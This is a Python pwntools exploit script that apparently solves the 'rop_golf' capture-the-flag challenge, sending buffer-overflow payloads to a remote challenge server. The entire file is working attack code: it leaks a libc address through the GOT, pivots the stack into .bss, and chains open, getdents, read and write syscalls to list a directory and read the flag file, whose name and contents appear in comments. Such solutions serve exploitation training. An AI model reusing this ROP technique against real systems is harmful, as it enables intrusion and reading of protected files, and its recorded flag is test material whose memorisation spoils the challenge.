from pwn import *
context.update(arch="amd64", os="linux")

elf = ELF("./rop_golf")
rop = ROP(elf)
libc = ELF("./libc.so.6")
rop_libc = ROP(libc)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sock = remote("tamuctf.com", 443, ssl=True, sni="rop-golf")
#sock = process(elf.path)

pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]
pop_rbp = rop.find_gadget(["pop rbp","ret"])[0]
leave_ret = rop.find_gadget(["leave","ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 0x28
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.symbols["puts"])
payload += p64(elf.symbols["vuln"])

sock.sendafter(b"hi!\n", payload)
leak = u64(sock.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
log.info("leak puts addr = " + hex(leak))
libc.address = leak - libc.sym["puts"]
log.info("libc base addr = " + hex(libc.address))


writable_area = 0x404c00 # .bss
payload = b"A" * 0x20
payload += p64(writable_area + 64 - 8)
payload += p64(pop_rdi)
payload += p64(writable_area)
payload += p64(libc.symbols["gets"])
payload += p64(leave_ret)
sock.send(payload)

pop_rax = libc.address + rop_libc.find_gadget(["pop rax","ret"])[0]
pop_rdx = libc.address + rop_libc.find_gadget(["pop rdx","ret"])[0] 
pop_rsi = libc.address + rop_libc.find_gadget(["pop rsi","ret"])[0]
syscall_ret = libc.address + rop_libc.find_gadget(["syscall","ret"])[0]
xchg_edi_eax = libc.address + 0x0000000000116dbc # xchg eax, edi ; ret


def send_payload1():
    dir_name = b"/pwn/".ljust(64, b"\x00")
    
    # sys_open(rdi: filename, rsi: flags[, rdx: mode])
    payload_getdents = dir_name 
    payload_getdents += p64(pop_rdi)
    payload_getdents += p64(writable_area)
    payload_getdents += p64(pop_rsi)
    payload_getdents += p64(constants.O_RDONLY)
    payload_getdents += p64(pop_rax)
    payload_getdents += p64(constants.SYS_open)
    payload_getdents += p64(syscall_ret)
    
    # sys_getdents(rdi: fd, rsi: (struct linux_dirent *)dirent, rdx: count)
    payload_getdents += p64(xchg_edi_eax)
    payload_getdents += p64(pop_rsi)
    payload_getdents += p64(writable_area - 0x100)
    payload_getdents += p64(pop_rdx)
    payload_getdents += p64(0x200)
    payload_getdents += p64(pop_rax)
    payload_getdents += p64(constants.SYS_getdents)
    payload_getdents += p64(syscall_ret)
    
    # sys_write(rdi: fd, rsi: buf, rdx: count)
    payload_getdents += p64(pop_rdi)
    payload_getdents += p64(constants.STDOUT_FILENO)
    payload_getdents += p64(pop_rsi)
    payload_getdents += p64(writable_area - 0x100)
    payload_getdents += p64(pop_rdx)
    payload_getdents += p64(0x200)
    payload_getdents += p64(pop_rax)
    payload_getdents += p64(constants.SYS_write)
    payload_getdents += p64(syscall_ret)
    
    sock.sendline(payload_getdents)
    # => flag file is /pwn/066A2462DEB399BA9183A91FC116914C.txt

def send_payload2():
    fname = b"/pwn/066A2462DEB399BA9183A91FC116914C.txt".ljust(64, b"\x00")

    # sys_open(rdi: filename, rsi: flags[, rdx: mode])
    payload_readfile = fname 
    payload_readfile += p64(pop_rdi)
    payload_readfile += p64(writable_area)
    payload_readfile += p64(pop_rsi)
    payload_readfile += p64(constants.O_RDONLY)
    payload_readfile += p64(pop_rax)
    payload_readfile += p64(constants.SYS_open)
    payload_readfile += p64(syscall_ret)

    # sys_read(rdi: fd, rsi: buf, rdx: count)
    payload_readfile += p64(xchg_edi_eax)
    payload_readfile += p64(pop_rsi)
    payload_readfile += p64(writable_area)
    payload_readfile += p64(pop_rdx)
    payload_readfile += p64(0x80)
    payload_readfile += p64(pop_rax)
    payload_readfile += p64(constants.SYS_read)
    payload_readfile += p64(syscall_ret)

    # sys_write(rdi: fd, rsi: buf, rdx: count)
    payload_readfile += p64(pop_rdi)
    payload_readfile += p64(constants.STDOUT_FILENO)
    payload_readfile += p64(pop_rsi)
    payload_readfile += p64(writable_area)
    payload_readfile += p64(pop_rdx)
    payload_readfile += p64(0x80)
    payload_readfile += p64(pop_rax)
    payload_readfile += p64(constants.SYS_write)
    payload_readfile += p64(syscall_ret)

    sock.sendline(payload_readfile)
    # => flag is gigem{r34lly_p1v071n6_7h47_574ck}


send_payload2()
sock.interactive()
